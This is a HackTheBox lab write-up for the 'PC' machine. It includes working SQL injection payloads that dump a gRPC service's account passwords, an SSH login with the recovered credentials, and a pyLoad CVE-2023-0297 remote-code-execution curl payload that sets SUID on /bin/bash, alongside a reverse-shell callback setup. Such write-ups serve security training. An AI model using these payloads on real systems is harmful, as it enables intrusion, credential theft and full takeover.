## HackTheBox PC

An Easy level CTF lab machine of the HackTheBox platform running Linux containing a gRPC service with SQL Injection, password reuse and a public exploit.

## Service Overview

The machine is assigned IP address 10.10.11.214, let's scan the ports with Nmap:

```bash
$ nmap -A -p- -Pn -T4 10.10.11.214

PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
```

Port 50051 – gRPC service.

## grpcui

Let's use the graphical representation of grpcui - https://github.com/fullstorydev/grpcui.

```bash
$ ./grpcui --plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:41859/
```

And this will lead us to a web interface where we can interact with the service.
As it can be seen that the same methods are available here as well. We can try to interact with the RegisterUser method and see if we get any response.
As we send this request, we get a response saying that the account has been created for this user.
We can use the same credentials now and try to login to the service with the LoginUser method.
It does work and we get 2 things in the response:

- Our ID in the response data
- A Token in the response trailer

Now, we can test the last method getInfo and see if we get any response.

So, here all that we need to do is just enter the id that we want to look up. We can try the id value that we got by logging in and see if we get any response.
Looks like this did not work as we had not provided the token in the request. So, we can try to add the token that we received while logging in in the request metadata and see if we get any successful response.

```bash
token    b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODkxMTM4Nzh9.guIZNYmKATLWgTSlE5i6wKnNPJDAfuYUlXGg5Wf6FSc'
```

And this time the request goes through successfully and we get a response with a message in it.

Send that request with "id" parameter is vulnerable to sqlite injection. Below example vulnerable requests:

```sql
0 union SELECT username FROM accounts WHERE username NOT like 'sqlite_%' limit 1--

0 union SELECT username FROM accounts LIMIT 1 OFFSET 1;

{
  "message": "sau"
}

0 union SELECT GROUP_CONCAT(password) FROM accounts;
{
  "message": "admin,HereIsYourPassWord1431"
}
```

In this way you can get user and passwd for SSH ```sau:HereIsYourPassWord1431```.

## User flag

```bash
$ ssh sau@10.10.11.214                             
HereIsYourPassWord1431
-bash-5.0$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
-bash-5.0$ ls -la
total 44
drwxr-xr-x 5 sau  sau  4096 Jul 11 17:31 .
drwxr-xr-x 3 root root 4096 Jan 11 18:10 ..
lrwxrwxrwx 1 root root    9 Jan 11 18:08 .bash_history -> /dev/null
-rw-r--r-- 1 sau  sau   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sau  sau  3771 Feb 25  2020 .bashrc
drwx------ 2 sau  sau  4096 Jan 11 17:43 .cache
drwxrwxr-x 3 sau  sau  4096 Jul 11 11:23 .local
-rw-r--r-- 1 sau  sau   807 Feb 25  2020 .profile
drwx------ 2 sau  sau  4096 Jul 11 11:01 .ssh
-rw------- 1 sau  sau  1125 Jul 11 17:31 .viminfo
-rw-rw-r-- 1 sau  sau    55 Jul 11 14:25 bash.sh
-rw-r----- 1 root sau    33 Jul 11 10:42 user.txt
-bash-5.0$ cat user.txt 
ea0e2870b02b9c983ef9e371fb6e90e7
```

## Privilege escalation

Let's see what ports are open. We see an application on port 8000 looking at 127.0.0.1.

```bash
$ find / -perm /4000 2>/dev/null
$ netstat -tulpn
```

There is 8000 port running, and the service running on it is pyLoad. There is a CVE related to it https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad.

```bash
$ curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"chmod%20u%2Bs%20%2Fbin%2Fbash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'

$ /bin/bash -p

bash-5.0# cat root.txt 
f09c10a5010a1e5e4d2bed5a61c864de
```
or

Let's redirect the port using SSH.

```bash
$ ssh -L 127.0.0.1:8000:127.0.0.1:8000 sau@10.10.11.214
HereIsYourPassWord1431
```
Access the server on the browser by entering the following URL: http://127.0.0.1:8000/.

After trying default credentials without success, I conducted a search for vulnerabilities and discovered that pyLoad has a vulnerability (CVE-2023–0297).

After some searching I got an exploit to this CVE using Python here - https://github.com/JacobEbben/CVE-2023-0297.

Set up a listener on port 4444 on the local machine.

```bash
$ nc -lnvp 4444
```

Using exploit.py to get the root:

python3 exploit.py -t http://127.0.0.1:8000 -I 10.10.16.19 -P 4444

And finally rooted.

```bash
bash-5.0# cat root.txt 
f09c10a5010a1e5e4d2bed5a61c864de
```